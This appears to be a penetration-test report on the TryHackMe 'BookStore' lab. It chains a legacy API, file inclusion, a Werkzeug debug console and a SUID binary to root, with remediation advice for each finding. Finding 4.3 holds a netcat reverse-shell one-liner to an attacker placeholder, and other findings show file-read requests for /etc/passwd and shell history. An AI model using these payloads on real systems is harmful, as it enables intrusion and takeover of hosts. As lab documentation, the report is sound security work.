---
title: Formal Report
parent: Bookstore
grand_parent: THM Boxes
nav_order: 1
---

# Findings Report

**Target:** BookStore (TryHackMe Boot-to-Root Assessment)

| | |
|---|---|
| **Target Host** | 10.65.179.176 |
| **Assessment Type** | Black-box, unauthenticated web & API penetration test |
| **Assessor** | kali |
| **Report Date** | 28 July 2026 |
| **Overall Risk Rating** | Critical |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope](#2-scope)
3. [Methodology](#3-methodology)
4. [Detailed Findings](#4-detailed-findings)
   - 4.1 [Undocumented Legacy API Version (v1) Publicly Accessible](#41-undocumented-legacy-api-version-v1-publicly-accessible)
   - 4.2 [Local File Inclusion (LFI) via 'show' Parameter](#42-local-file-inclusion-lfi-via-show-parameter)
   - 4.3 [Unauthenticated RCE via Exposed Werkzeug Debug Console](#43-unauthenticated-rce-via-exposed-werkzeug-debug-console)
   - 4.4 [Local Privilege Escalation via Misconfigured SUID Binary](#44-local-privilege-escalation-via-misconfigured-suid-binary)
5. [Attack Narrative / Kill Chain](#5-attack-narrative--kill-chain)
6. [Summary of Recommendations](#6-summary-of-recommendations)
7. [Conclusion](#7-conclusion)
8. [Appendix: Tools Used](#8-appendix-tools-used)

---

## 1. Executive Summary

This report documents a black-box penetration test performed against the BookStore host (`10.65.179.176`), a TryHackMe boot-to-root exercise simulating a small web application backed by a Flask/Werkzeug REST API. The objective of the assessment was to identify and exploit vulnerabilities that would allow an unauthenticated attacker to compromise the confidentiality, integrity, and availability of the host.

The assessment identified a critical chain of vulnerabilities beginning with an undocumented legacy API version, escalating through a Local File Inclusion (LFI) flaw, and culminating in unauthenticated Remote Code Execution (RCE) via the exposed Werkzeug interactive debugger. Upon foothold onto the system, a misconfigured SUID binary served as a local privilege escalation vector which allowed full compromise of the host with root-level access.

In total, four findings were identified and are summarized below.

| # | Finding | Severity | CVSS 3.1 |
|---|---|---|---|
| 1 | Undocumented Legacy API Version (v1) Publicly Accessible | 🟢 Low | 5.3 |
| 2 | Local File Inclusion (LFI) via `show` Parameter | 🟠 High | 7.5 |
| 3 | Unauthenticated RCE via Exposed Werkzeug Debug Console | 🔴 Critical | 9.8 |
| 4 | Local Privilege Escalation via Misconfigured SUID Binary | 🔴 Critical | 8.8 |

Chained together, these findings resulted in full remote compromise of the host, from unauthenticated network access to a root-level interactive shell, with no valid credentials required at any stage.

---

## 2. Scope

| | |
|---|---|
| **In-Scope Host** | 10.65.179.176 |
| **In-Scope Ports** | 22 (SSH), 80 (HTTP), 5000 (Flask/Werkzeug API) |
| **Testing Type** | Black-box, unauthenticated, external |
| **Rules of Engagement** | TryHackMe standard lab terms of service |

---

## 3. Methodology

The assessment followed a standard black-box methodology with the following phases:

- Reconnaissance & Service Enumeration (Nmap, manual browsing)
- Web & API Content Discovery (`robots.txt`, endpoint review, API versioning)
- Parameter Fuzzing (`ffuf`)
- Vulnerability Identification & Exploitation (LFI, Werkzeug PIN derivation)
- Post-Exploitation & Privilege Escalation (binary reverse engineering)

---

## 4. Detailed Findings

### 4.1 Undocumented Legacy API Version (v1) Publicly Accessible

| | |
|---|---|
| **Severity** | Low |
| **CVSS 3.1 Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3) |
| **Affected Component** | `http://10.65.179.176:5000/api/v1/*` |

**Description**

The current API documentation, discovered via a `robots.txt` disclosure, referenced only the v2 API. Manual testing confirmed that a legacy v1 API version remained live and fully functional, exposing all v2 endpoints under an undocumented, unmaintained path. Legacy API versions are frequently deprioritized for security patching, increasing the likelihood they retain vulnerabilities already fixed in the current version.

**Proof of Concept**

The v2 API was intercepted in Burp Suite, sent to Repeater, and the version segment was changed from `v2` to `v1`:

```
GET /api/v1/resources/books HTTP/1.1
Host: 10.65.179.176:5000
```

The request succeeded and returned the same functional dataset as the current v2 API, confirming the legacy version was still live.

**Impact**

An unmaintained API surface increases the attack surface available to an unauthenticated attacker and may expose vulnerabilities already remediated in the current version, as demonstrated by Finding 4.2.

**Remediation**

- Decommission or disable legacy API versions once superseded.
- If legacy versions must remain available for compatibility, apply the same security controls and patching cadence as the current version.

---

### 4.2 Local File Inclusion (LFI) via `show` Parameter

| | |
|---|---|
| **Severity** | High |
| **CVSS 3.1 Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) |
| **Affected Component** | `GET /api/v1/resources/books?show=<file>` |

**Description**

Parameter fuzzing against the legacy v1 API using `ffuf` identified an undocumented, hidden parameter named `show`. Supplying a filesystem path to this parameter caused the server to read and return the contents of the specified file with no path validation or sanitization, resulting in a classic Local File Inclusion vulnerability.

**Proof of Concept**

Parameter discovery:

```bash
ffuf -u http://10.65.179.176:5000/api/v1/resources/books?FUZZ=1 \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

Confirmed arbitrary file read:

```
GET /api/v1/resources/books?show=/etc/passwd HTTP/1.1
Host: 10.65.179.176:5000
```

The request returned the full contents of `/etc/passwd`, confirming unauthenticated arbitrary file read on the host.

**Impact**

This vulnerability alone allows disclosure of any file readable by the web application user, including configuration files, source code, and system files such as `/etc/passwd`, `/etc/machine-id`, and process metadata under `/proc`. As demonstrated in Finding 4.3, it was leveraged as the initial access vector for full remote code execution.

**Remediation**

- Never pass user-controlled input directly into filesystem read operations.
- Enforce an allow-list of permitted file identifiers rather than accepting arbitrary paths.
- Run the application under a least-privilege service account with restricted filesystem read access.

---

### 4.3 Unauthenticated RCE via Exposed Werkzeug Debug Console

| | |
|---|---|
| **Severity** | Critical |
| **CVSS 3.1 Vector** | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (9.8) |
| **Affected Component** | Werkzeug interactive debugger, `/console` |

**Description**

The Flask application was running with debug mode enabled, exposing the Werkzeug interactive debugger. While the debugger console is normally protected by a PIN derived from server-specific values (host user, MAC address, machine ID, and application file path), the LFI vulnerability documented in Finding 4.2 allowed the unauthenticated attacker to derive the pin from the flask user's bash history.

**Proof of Concept**

PIN recovered directly from the application user's shell history:

```
GET /api/v1/resources/books?show=/home/sid/.bash_history HTTP/1.1
Host: 10.65.179.176:5000
```

The retrieved history file contained the console PIN in plaintext, which was submitted at `/console` to unlock the interactive Python debugger and achieve remote code execution:

```python
__import__('os').popen(
  'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker_ip> 1337 >/tmp/f'
).read();
```

A reverse shell callback was received as the `sid` user, confirming remote code execution.

**Impact**

This finding results in complete unauthenticated remote code execution as the application user. Combined with the LFI vulnerability, it fully compromises the confidentiality, integrity, and availability of the host.

**Remediation**

- Disable Flask/Werkzeug debug mode in any production or externally reachable environment (`debug=False`).
- Never expose the interactive debugger endpoint outside of a trusted local development environment.
- Remediate the underlying LFI vulnerability (Finding 4.2), which is a prerequisite for this attack chain.
- Audit and purge shell history and other logs on production hosts for sensitive data such as debug PINs or credentials.

---

### 4.4 Local Privilege Escalation via Misconfigured SUID Binary

| | |
|---|---|
| **Severity** | Critical |
| **CVSS 3.1 Vector** | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) |
| **Affected Component** | `/home/sid/try-harder` (SUID binary) |

**Description**

A custom SUID binary with root file owner permissions named `try-harder` was discovered on the host during post-exploitation enumeration. Reverse engineering the binary in Ghidra revealed that it calls `setuid(0)` unconditionally at the start of execution, then prompts the user for a numeric "magic number." The supplied value is XORed against two hardcoded constants and compared to a fixed result; if the check passes, the binary spawns a root-privileged bash shell via `system("/bin/bash -p")`.

**Proof of Concept**

Decompiled logic (Ghidra):

```c
setuid(0);
hardcoded_23987 = 0x5db3;
scanf("%u", &local_1c);
magic_num = local_1c ^ 0x1116 ^ hardcoded_23987;
if (magic_num == 1573724660) { system("/bin/bash -p"); }
```

Since the XOR operation is reversible, the valid input was recovered by XORing the hardcoded target value against both constants:

```
magic_number = 1573724660 ^ 0x1116 ^ 0x5db3
             = 1573743953
```

Running the binary and supplying this value returned an interactive root shell.

**Impact**

Any local user able to execute this SUID binary can trivially reverse the check and obtain a root shell, resulting in complete compromise of the host.

**Remediation**

- Remove unnecessary SUID bits from custom binaries; this functionality should never be exposed via a SUID-root binary.
- If elevated functionality is required, use a narrowly scoped `sudo` rule with explicit command restrictions instead of a SUID binary.
- Do not rely on obfuscated or "security through obscurity" checks (e.g. XOR comparisons) as an authorization mechanism.

---

## 5. Attack Narrative / Kill Chain

1. Enumerated open ports via Nmap: 22 (SSH), 80 (HTTP), 5000 (Werkzeug/Flask API).
2. Located API documentation via a `robots.txt` disclosure and identified the current v2 API.
3. Discovered a live, undocumented v1 legacy API by manually modifying the version segment of an intercepted request (Finding 4.1).
4. Fuzzed API parameters with `ffuf` and discovered a hidden `show` parameter.
5. Confirmed and exploited a Local File Inclusion vulnerability via the `show` parameter (Finding 4.2).
6. Identified the exposed Werkzeug debugger at the default ```/console``` location.
7. Recovered the debugger PIN directly from the application user's `.bash_history` via the same LFI primitive, and used it to unlock the debug console (Finding 4.3).
8. Executed a reverse shell payload through the debug console to obtain an interactive session as user `sid`.
9. Enumerated the filesystem post-exploitation and discovered a custom SUID binary, `try-harder`.
10. Reverse engineered the binary in Ghidra, recovered the required "magic number" via reversible XOR arithmetic, and executed it to obtain a root shell (Finding 4.4).

---

## 6. Summary of Recommendations

The following remediation actions, in priority order, would have prevented or substantially disrupted this attack chain:

- **Disable Flask/Werkzeug debug mode** in any non-local environment — this single control would have prevented Finding 4.3 and the resulting RCE entirely.
- **Remediate the LFI vulnerability** in the `show` parameter by enforcing strict input validation / allow-listing — this would have blocked the initial foothold as well as PIN/credential leakage.
- **Decommission the legacy v1 API** to reduce overall attack surface.
- **Remove SUID bits from custom binaries** and replace with scoped `sudo` rules.
- **Regularly audit shell history and log files** on production systems for inadvertently stored secrets.

---

## 7. Conclusion

The BookStore host was fully compromised from an unauthenticated, external starting position to root-level access. The root cause of the compromise was a chain of individually serious but jointly critical issues: an exposed legacy API surface, an unauthenticated file-read vulnerability, a debug interface left enabled in a production environment, and a privilege escalation vector relying on obfuscation rather than access control. Addressing the Werkzeug debug mode and the LFI vulnerability would have independently broken this attack chain at its earliest stages.

---

## 8. Appendix: Tools Used

- **Nmap** — service and port enumeration
- **Burp Suite** — request interception and manipulation
- **ffuf** — parameter and content fuzzing
- **Netcat** — reverse shell listener
- **Ghidra** — binary reverse engineering
